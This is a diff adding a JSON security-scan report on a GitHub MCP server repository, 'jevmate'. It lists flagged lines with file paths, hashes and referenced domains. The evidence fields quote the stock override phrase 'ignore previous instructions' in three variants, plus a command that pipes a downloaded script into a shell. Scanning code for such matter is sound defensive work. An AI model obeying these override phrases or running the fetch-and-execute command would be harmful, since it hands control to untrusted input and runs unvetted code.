@@ -1,0 +1,77 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "GastonGelhorn/jevmate",
+    "version": "601dcf82a8b285c7760cacfd561680a72e7c662f",
+    "download": "https://codeload.github.com/GastonGelhorn/jevmate/tar.gz/601dcf82a8b285c7760cacfd561680a72e7c662f"
+  },
+  "archive_sha256": "da36e1f98c494b0f6d84f26ebd1f5dde2955352600d8352f07a379fa934ed268",
+  "findings": [
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "jevmate-601dcf82a8b285c7760cacfd561680a72e7c662f/.claude-plugin/plugin.json",
+      "line": 42,
+      "evidence": "p=0.98 ask: prompt before a command that looks destructive (p >= 0.60); where no permis",
+      "file_sha256": "329f190f1c031f9b5f7a28a2142911de1848888c021a3151cad9955b7f7ea56e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "jevmate-601dcf82a8b285c7760cacfd561680a72e7c662f/jev/guide/hooks.md",
+      "line": 31,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "1a8bf7fea74da337b4364d55841c38408fc6e7f544dae976aee4818b10da57a1"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "jevmate-601dcf82a8b285c7760cacfd561680a72e7c662f/docs/MEASUREMENTS.md",
+      "line": 100,
+      "evidence": "ignore your previous instructions",
+      "file_sha256": "23569dc71b4679fa8d554d0e7d071e036e0debe082bd38ba44b09ae913b516ec"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "jevmate-601dcf82a8b285c7760cacfd561680a72e7c662f/tests/test_shellrules.py",
+      "line": 116,
+      "evidence": "curl -s https://example.com | sh",
+      "file_sha256": "c12421279716e245a9daddb1bfa14b778ac1a5f728254ccc318ddc3bc384c1d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "jevmate-601dcf82a8b285c7760cacfd561680a72e7c662f/tests/test_hooks.py",
+      "line": 245,
+      "evidence": "Ignore earlier instructions",
+      "file_sha256": "b9d42eb639ed3020636ae700b0ee175a3cfd51b53b598c99065052732afffe8f"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "10.0.0.9",
+    "100.74.0.1",
+    "127.0.0.1",
+    "api.example.com",
+    "api.typesafe.ai",
+    "box.tail.ts.net",
+    "console.typesafe.ai",
+    "docs.typesafe.ai",
+    "example.com",
+    "github.com",
+    "ollama.com",
+    "ollama.example.ts.net",
+    "openrouter.ai",
+    "raw.githubusercontent.com",
+    "x.example"
+  ],
+  "install_script": false,
+  "score": "high"
+}
